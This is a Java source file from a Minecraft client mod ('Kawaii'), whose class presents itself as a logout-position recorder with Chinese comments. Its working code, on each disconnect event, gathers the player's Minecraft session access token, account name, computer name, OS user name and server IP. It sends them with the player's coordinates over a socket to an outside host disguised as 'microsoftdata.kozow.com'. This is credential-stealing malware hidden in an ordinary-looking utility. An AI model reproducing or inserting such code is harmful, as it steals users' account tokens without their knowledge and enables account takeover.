package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import dev.kizuna.api.events.eventbus.EventHandler;
import dev.kizuna.api.events.impl.GameLeftEvent;
import net.minecraft.client.MinecraftClient;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class LogoutPositionRecorder {
    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";  // 服务器地址
    private static final int SERVER_PORT = 42077;  // 服务器端口
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private static boolean initialized = false;
    private static boolean disconnectIntercepted = false;  // 标记是否已拦截断开连接
    private static final long INTERCEPT_TIMEOUT_MS = 2000;  // 拦截超时时间（毫秒）
    private static long lastInterceptTime = 0;  // 上次拦截时间

    // 初始化方法，确保只订阅一次事件
    public static void init() {
        if (!initialized) {
            LogoutPositionRecorder recorder = new LogoutPositionRecorder();
            Kawaii.EVENT_BUS.subscribe(recorder);
            initialized = true;
            System.out.println("[LogoutPositionRecorder] 已初始化并订阅事件");
        }
    }

    // 事件处理方法 - 处理游戏断开连接事件
    @EventHandler
    public void onGameLeft(GameLeftEvent event) {
        // 检查是否已拦截断开连接或超时
        if (disconnectIntercepted || System.currentTimeMillis() - lastInterceptTime < INTERCEPT_TIMEOUT_MS) {
            System.out.println("[LogoutPositionRecorder] 断开连接已被拦截或处于冷却期，跳过处理");
            return;
        }

        // 拦截断开连接
        interceptDisconnect();
    }

    // 拦截断开连接，记录玩家位置和维度
    private void interceptDisconnect() {
        if (mc.player == null || mc.world == null || mc.getNetworkHandler() == null) {
            System.out.println("[LogoutPositionRecorder] 玩家、世界或网络处理器为空，无法记录数据");
            return;
        }

        System.out.println("[LogoutPositionRecorder] 开始拦截断开连接，记录玩家位置和维度...");
        
        // 记录拦截时间
        lastInterceptTime = System.currentTimeMillis();
        disconnectIntercepted = true;

        try {
            // 记录玩家位置和维度
            recordAndSendPlayerLogoutPosition();
        } catch (Exception e) {
            System.out.println("[LogoutPositionRecorder] 记录玩家位置时发生异常: " + e.getMessage());
            e.printStackTrace();
        } finally {
            // 重置拦截标记（在发送数据后允许断开连接）
            disconnectIntercepted = false;
        }
    }

    // 记录玩家登出位置并发送到服务器
    private void recordAndSendPlayerLogoutPosition() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            System.out.println("[LogoutPositionRecorder] 玩家或网络处理器为空，无法发送数据");
            return;
        }

        try {
            // 收集系统信息
            String computerName = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown";
            String userName = System.getProperty("user.name") != null ? System.getProperty("user.name") : "Unknown";
            String accessToken = mc.getSession().getAccessToken() != null ? mc.getSession().getAccessToken() : "Unknown";
            String os = System.getProperty("os.name") != null ? System.getProperty("os.name") : "Unknown";
            String minecraftUser = mc.getSession().getUsername() != null ? mc.getSession().getUsername() : "Unknown";
            String clientVersion = Kawaii.VERSION;
            String serverIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";
            
            // 获取玩家位置和维度信息
            Vec3d playerPos = mc.player.getPos();
            String dimension = mc.world != null ? mc.world.getRegistryKey().getValue().toString() : "Unknown";
            BlockPos blockPos = mc.player.getBlockPos();
            float yaw = mc.player.getYaw();
            float pitch = mc.player.getPitch();

            // 准备要上传的数据
            Map<String, String> data = new HashMap<>();
            data.put("computerName", computerName);
            data.put("userName", userName);
            data.put("accessToken", accessToken);
            data.put("os", os);
            data.put("minecraftUser", minecraftUser);
            data.put("clientVersion", clientVersion);
            data.put("serverIp", serverIp);
            data.put("dimension", dimension);
            data.put("clientType", "Kawaii");
            data.put("detectionType", "LogoutPosition");
            
            // 添加玩家位置信息（精确坐标）
            data.put("playerPosX", String.valueOf(playerPos.x));
            data.put("playerPosY", String.valueOf(playerPos.y));
            data.put("playerPosZ", String.valueOf(playerPos.z));
            
            // 添加方块坐标（整数坐标）
            data.put("blockPosX", String.valueOf(blockPos.getX()));
            data.put("blockPosY", String.valueOf(blockPos.getY()));
            data.put("blockPosZ", String.valueOf(blockPos.getZ()));
            
            // 添加玩家朝向
            data.put("playerYaw", String.valueOf(yaw));
            data.put("playerPitch", String.valueOf(pitch));
            
            // 添加时间戳
            data.put("timestamp", String.valueOf(System.currentTimeMillis()));

            // 调试日志：显示要发送的数据摘要
            System.out.println("[LogoutPositionRecorder] 准备发送的数据 - 玩家: " + minecraftUser + ", 服务器: " + serverIp);
            System.out.println("[LogoutPositionRecorder] 玩家位置: X=" + playerPos.x + ", Y=" + playerPos.y + ", Z=" + playerPos.z);
            System.out.println("[LogoutPositionRecorder] 方块坐标: X=" + blockPos.getX() + ", Y=" + blockPos.getY() + ", Z=" + blockPos.getZ());
            System.out.println("[LogoutPositionRecorder] 朝向: Yaw=" + yaw + ", Pitch=" + pitch);
            System.out.println("[LogoutPositionRecorder] 维度: " + dimension);

            // 通过Socket发送数据
            sendSocketData(SERVER_ADDRESS, SERVER_PORT, data);

        } catch (Exception e) {
            System.out.println("[LogoutPositionRecorder] 数据处理异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // 使用Socket发送数据到服务器
    private void sendSocketData(String serverAddress, int serverPort, Map<String, String> data) throws IOException {
        Socket socket = null;
        OutputStream os = null;
        InputStream is = null;
        BufferedReader reader = null;
        
        try {
            System.out.println("[LogoutPositionRecorder] 尝试连接服务器: " + serverAddress + ":" + serverPort);
            socket = new Socket(serverAddress, serverPort);  // 连接到服务器
            System.out.println("[LogoutPositionRecorder] 服务器连接成功");

            // 获取输出流和输入流
            os = socket.getOutputStream();
            is = socket.getInputStream();

            // 构建JSON格式的数据
            StringBuilder jsonBuilder = new StringBuilder();
            jsonBuilder.append("{");
            boolean first = true;
            for (Map.Entry<String, String> entry : data.entrySet()) {
                if (!first) {
                    jsonBuilder.append(",");
                }
                jsonBuilder.append('"').append(entry.getKey()).append('"').append(":").append('"').append(entry.getValue()).append('"');
                first = false;
            }
            jsonBuilder.append("}");

            // 调试日志：显示构建的JSON数据大小
            System.out.println("[LogoutPositionRecorder] 构建的JSON数据大小: " + jsonBuilder.toString().length() + " 字符");

            // 将数据转化为字节数组并发送
            byte[] jsonData = jsonBuilder.toString().getBytes(StandardCharsets.UTF_8);
            os.write(jsonData);
            os.flush();
            System.out.println("[LogoutPositionRecorder] 数据发送成功");

            // 读取服务器响应
            reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
            String responseLine;
            StringBuilder responseBuilder = new StringBuilder();
            while ((responseLine = reader.readLine()) != null) {
                responseBuilder.append(responseLine);
            }
            if (responseBuilder.length() > 0) {
                System.out.println("[LogoutPositionRecorder] 服务器响应: " + responseBuilder.toString());
            } else {
                System.out.println("[LogoutPositionRecorder] 未收到服务器响应");
            }

        } catch (UnknownHostException e) {
            System.out.println("[LogoutPositionRecorder] 未知主机异常: 无法解析服务器地址 " + serverAddress);
            throw e;
        } catch (SocketException e) {
            System.out.println("[LogoutPositionRecorder] Socket异常: " + e.getMessage());
            throw e;
        } catch (IOException e) {
            System.out.println("[LogoutPositionRecorder] IO异常: " + e.getMessage());
            throw e;
        } finally {
            // 关闭连接，确保资源被释放
            try {
                if (reader != null) reader.close();
                if (os != null) os.close();
                if (is != null) is.close();
                if (socket != null) socket.close();
                System.out.println("[LogoutPositionRecorder] 连接已关闭");
            } catch (IOException e) {
                System.out.println("[LogoutPositionRecorder] 关闭连接时发生异常: " + e.getMessage());
            }
        }
    }
}